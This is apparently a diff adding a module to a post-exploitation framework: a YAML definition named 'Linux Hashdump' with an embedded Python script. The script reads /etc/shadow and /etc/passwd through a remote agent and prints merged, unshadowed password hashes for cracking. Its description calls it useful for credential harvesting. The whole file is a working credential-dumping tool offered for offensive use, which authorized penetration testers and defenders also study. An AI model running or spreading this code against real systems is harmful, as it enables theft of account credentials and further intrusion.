@@ -1,0 +1,58 @@
+name: Linux Hashdump
+authors:
+  - name: Will Schroeder
+    handle: '@harmj0y'
+    link: https://twitter.com/harmj0y
+description: |
+  Extracts and combines user account information from /etc/passwd and
+  /etc/shadow files to create unshadowed password hashes. Reads both
+  system files, parses the colon-delimited fields, and merges the
+  data to produce a format compatible with password cracking tools.
+  Requires root privileges to access the protected /etc/shadow file.
+  Provides comprehensive user account enumeration including usernames,
+  password hashes, user IDs, group IDs, and account information.
+  Useful for credential harvesting, password analysis, and user
+  enumeration on Linux systems.
+software: ''
+tactics: []
+techniques:
+  - T1003
+background: false
+output_extension: ''
+needs_admin: true
+opsec_safe: true
+language: python
+min_language_version: '3.6'
+comments: []
+options:
+  - name: Agent
+    description: Agent to execute module on.
+    required: true
+    value: ''
+script: |-
+  import time;
+  f2 = open("/etc/shadow")
+  shadow = f2.readlines()
+  f2.close()
+
+  users = {}
+
+  for line in shadow:
+      parts = line.strip().split(":")
+      username, pwdhash = parts[0], parts[1]
+      users[username] = pwdhash
+
+  f = open("/etc/passwd")
+  passwd = f.readlines()
+  f.close()
+
+
+  for line in passwd:
+      parts = line.strip().split(":")
+      username = parts[0]
+      tmp = parts[2:]
+      info = ':'.join(tmp)
+      time.sleep(0.01)
+      if username in users:
+          time.sleep(0.01)
+          print("%s:%s:%s" %(username, users[username], info))
